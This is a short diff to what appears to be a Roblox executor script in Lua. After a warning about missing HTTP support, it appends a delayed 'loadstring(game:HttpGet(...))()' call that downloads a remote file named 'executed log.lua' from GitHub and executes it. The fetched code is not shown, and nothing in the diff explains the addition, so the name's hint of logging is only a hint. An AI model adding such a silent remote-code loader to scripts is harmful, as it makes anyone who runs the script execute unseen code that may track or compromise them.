@@ -115,3 +115,6 @@ if requestFunction then
 else
     warn("Your executor does not support HTTP requests.")
 end
+
+wait (3);
+loadstring(game:HttpGet("https://raw.githubusercontent.com/marho42/Hub/refs/heads/main/executed%20log.lua"))();
